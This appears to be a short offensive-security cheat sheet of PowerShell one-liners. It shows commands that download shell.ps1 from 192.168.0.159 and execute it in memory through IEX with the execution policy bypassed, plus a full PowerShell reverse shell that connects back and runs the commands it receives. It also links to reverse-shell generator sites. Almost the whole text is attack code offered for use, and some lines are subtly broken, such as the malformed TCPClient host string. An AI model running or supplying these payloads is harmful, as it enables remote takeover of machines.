## Download file using powershell

```console
# Using WebClient.Downloadfile
D:\> powershell -command "(New-Object System.Net.WebClient).DownloadFile(\"http://192.168.0.159:8002/shell.ps1\", \"shell.ps1\")"

# Invoke-WebRequuest
D:\> powershell Invoke-WebRequest -Uri "http://192.168.0.159:8002/shell.ps1" -OutFile "shell.ps1"

# Requiring authentication
D:\> powershell Invoke-WebRequest -Uri "http://192.168.0.159:8002/shell.ps1" -OutFile "shell.ps1" -Credential GetCredential 

# Execute generic CMD from powershell
D:\> powershell -command "whoami"'
```

## Script invocation
```console
# From CMD
D:\> PowerShell.exe -command "TestPS.ps1"


# From another powershell script
invoke-expression -Command .\TestPS.ps1
```

## Download and execute from server
```console
# Using WebClient.DownloadString and execute downloaded content
D:\> powershell "IEX (New-Object System.Net.WebClient).DownloadString(\"http://192.168.0.159:8002/shell.ps1\");"

# Pipe downloaded string to iex
D:\> powershell -exec bypass -c "iwr(\"http://192.168.0.159:8002/shell.ps1\")|iex"

```

## Powershell shell example
```
$client = New-Object System.Net.Sockets.TCPClient("192.168.0.159:8001",8001);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
	;
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + "# ";
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush()
};
$client.Close()
```

## Util infos
- https://github.com/davehardy20/PowerShell-Scripts
- https://book.hacktricks.xyz/shells/shells/windows
- https://www.revshells.com/
